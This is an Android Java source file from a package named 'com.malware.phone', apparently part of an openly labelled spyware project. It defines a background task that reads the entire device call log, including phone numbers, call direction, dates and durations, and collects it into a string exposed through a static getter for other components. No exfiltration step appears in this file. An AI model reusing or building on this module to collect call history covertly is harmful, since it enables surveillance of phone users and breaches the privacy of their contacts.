package com.malware.phone;

import java.util.Date;

import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.util.Log;

public class FetchAllCallTask extends AsyncTask {
	
	private static String callList;
	
	private final boolean VERBOSE = true;
	private final String TAG = "FetchContactsTask";
	
	@Override
	protected Object doInBackground(Object... params) {
		
		if (VERBOSE) Log.d(TAG, "Start of FetchAllSmsTask");

		callList = fetchCall((ContentResolver) params[0]);
		
		if (VERBOSE) Log.d(TAG, "End of FetchAllSmsTask");

		return null;
	}

	private String fetchCall(ContentResolver cr) {

		if (VERBOSE) Log.d(TAG, "Fetching calls");

		String callData = "";
		Cursor callCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
		int number = callCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = callCursor.getColumnIndex(CallLog.Calls.TYPE);
		int date = callCursor.getColumnIndex(CallLog.Calls.DATE);
		int duration = callCursor.getColumnIndex(CallLog.Calls.DURATION);
		
		callCursor.moveToFirst();

		if (callCursor.getCount() != 0) {
			for(int i = 0 ; i < callCursor.getCount() ; i++) {
				callData += "Call #" + Integer.toString(i+1);
				String phNumber = callCursor.getString(number);
				String callType = callCursor.getString(type);
				String callDate = callCursor.getString(date);
				Date callDayTime = new Date(Long.valueOf(callDate));
				String callDuration = callCursor.getString(duration);
				
				String dir = null;
				int dircode = Integer.parseInt(callType);
				
				switch (dircode) {
				case CallLog.Calls.OUTGOING_TYPE:
					dir = "OUTGOING";
					break;

				case CallLog.Calls.INCOMING_TYPE:
					dir = "INCOMING";
					break;

				case CallLog.Calls.MISSED_TYPE:
					dir = "MISSED";
					break;
				}

				callData+="\n--- Phone Number: " + phNumber + 
						" \n--- Call Type: "+ dir + 
						" \n--- Call Date: " + callDayTime
						+ " \n--- Call duration in sec : " + callDuration;

				callData += "\n\n"; // Just for readability
				callCursor.moveToNext();
			}
		} else {
			callData = "No call in memory";
		}
		return callData;
	}

	public static String getCallList() {
		return callList;
	}
}